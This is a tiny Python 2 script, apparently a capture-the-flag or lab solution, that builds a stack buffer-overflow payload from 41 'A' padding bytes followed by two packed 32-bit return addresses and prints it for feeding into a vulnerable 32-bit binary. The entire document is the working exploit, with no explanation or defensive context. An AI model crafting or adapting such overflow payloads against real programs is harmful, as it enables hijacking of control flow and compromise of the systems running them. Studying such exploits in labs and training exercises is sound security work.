import struct

def conv(x):
    return struct.pack("<I",x)

payload = "A" * 41 + conv(0x80484a6) + conv(0x080484e5)
print payload
